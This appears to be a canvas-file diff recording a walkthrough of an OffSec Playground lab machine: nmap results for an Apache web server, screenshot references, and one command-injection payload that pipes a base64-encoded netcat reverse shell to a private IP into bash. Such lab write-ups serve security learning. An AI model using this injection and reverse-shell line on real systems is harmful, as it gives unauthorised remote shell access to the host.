@@ -1,0 +1,38 @@
+{
+	"nodes":[
+		{"id":"ad80c6f2b90156dd","type":"group","x":360,"y":-360,"width":290,"height":110,"label":"TCP - open"},
+		{"id":"b501b5c15a16071a","type":"text","text":"# TARGET","x":-126,"y":-335,"width":250,"height":60},
+		{"id":"ae3ae34435863e3b","type":"text","text":"#### nmap\n```\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Site doesn't have a title (text/html; charset=UTF-8).\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\n```","x":-558,"y":-145,"width":638,"height":265},
+		{"id":"913e407397b4a05e","type":"text","text":"port 80","x":380,"y":-340,"width":250,"height":60},
+		{"id":"9c505627e72fb065","x":720,"y":-169,"width":460,"height":209,"type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260802022633.png"},
+		{"id":"ad35a44ca23fdd30","x":1480,"y":-264,"width":250,"height":400,"type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260802022747.png"},
+		{"id":"191c77b0b8c2ea82","x":1285,"y":580,"width":640,"height":671,"type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260802022814.png"},
+		{"id":"f2b87442440f483f","x":2120,"y":816,"width":608,"height":200,"type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260802022852.png"},
+		{"id":"2f07d93e36e4ceb2","x":2003,"y":1280,"width":843,"height":329,"type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260802022911.png"},
+		{"id":"8811236aac61c532","x":2061,"y":1740,"width":728,"height":280,"type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260802022938.png"},
+		{"id":"d1d6ee341e64db94","x":3120,"y":1662,"width":986,"height":437,"type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260802022958.png"},
+		{"id":"b0d646a7507b3564","x":2958,"y":2560,"width":1310,"height":1040,"type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260802023037.png"},
+		{"id":"ff75d64f1b0222ad","x":4680,"y":3020,"width":610,"height":121,"type":"text","text":"```\n127.0.0.1 | echo \"bmMudHJhZGl0aW9uYWwgMTkyLjE2OC40NS4yNDggNDQ0NCAtZSAvYmluL2Jhc2g=\" | base64 -d | bash\n```"},
+		{"id":"d91cf453c7aeec09","x":4594,"y":3340,"width":783,"height":380,"type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260802023406.png"},
+		{"id":"b65f992ce136d2a4","x":4651,"y":3860,"width":670,"height":680,"type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260802023435.png"},
+		{"id":"92c5047bc618ad3b","x":5760,"y":4030,"width":691,"height":340,"type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260802023457.png"},
+		{"id":"3b08740cb48521e7","x":4500,"y":4760,"width":973,"height":340,"type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260802023518.png"}
+	],
+	"edges":[
+		{"id":"919166a5336d209a","fromNode":"b501b5c15a16071a","fromSide":"right","toNode":"ad80c6f2b90156dd","toSide":"left"},
+		{"id":"43e029c60366ae69","fromNode":"b501b5c15a16071a","fromSide":"bottom","toNode":"ae3ae34435863e3b","toSide":"top"},
+		{"id":"0d83067976c4ce1b","fromNode":"ad80c6f2b90156dd","fromSide":"right","toNode":"9c505627e72fb065","toSide":"top"},
+		{"id":"1f2af8bb12c51e2e","fromNode":"9c505627e72fb065","fromSide":"right","toNode":"ad35a44ca23fdd30","toSide":"left"},
+		{"id":"15c63cb319fdea32","fromNode":"ad35a44ca23fdd30","fromSide":"bottom","toNode":"191c77b0b8c2ea82","toSide":"top","label":"I TRY TO GET FILES TO FIND ANY HIDDEN DATA IN IMG"},
+		{"id":"c557404a8558d954","fromNode":"191c77b0b8c2ea82","fromSide":"right","toNode":"f2b87442440f483f","toSide":"left"},
+		{"id":"fd1c44838aef4d71","fromNode":"f2b87442440f483f","fromSide":"bottom","toNode":"2f07d93e36e4ceb2","toSide":"top"},
+		{"id":"19f9705be9c25c0c","fromNode":"2f07d93e36e4ceb2","fromSide":"bottom","toNode":"8811236aac61c532","toSide":"top"},
+		{"id":"3de4abf1111d3caa","fromNode":"8811236aac61c532","fromSide":"right","toNode":"d1d6ee341e64db94","toSide":"left"},
+		{"id":"6087b950cc696edb","fromNode":"d1d6ee341e64db94","fromSide":"bottom","toNode":"b0d646a7507b3564","toSide":"top"},
+		{"id":"65e32f7772a263a6","fromNode":"b0d646a7507b3564","fromSide":"right","toNode":"ff75d64f1b0222ad","toSide":"left"},
+		{"id":"d952358f5af0c0e9","fromNode":"ff75d64f1b0222ad","fromSide":"bottom","toNode":"d91cf453c7aeec09","toSide":"top"},
+		{"id":"3cf9e4c09bb8afcf","fromNode":"d91cf453c7aeec09","fromSide":"bottom","toNode":"b65f992ce136d2a4","toSide":"top"},
+		{"id":"cfc0bbbc0cee567a","fromNode":"92c5047bc618ad3b","fromSide":"left","toNode":"b65f992ce136d2a4","toSide":"right"},
+		{"id":"2370c7d03e567a39","fromNode":"b65f992ce136d2a4","fromSide":"bottom","toNode":"3b08740cb48521e7","toSide":"top"}
+	]
+}
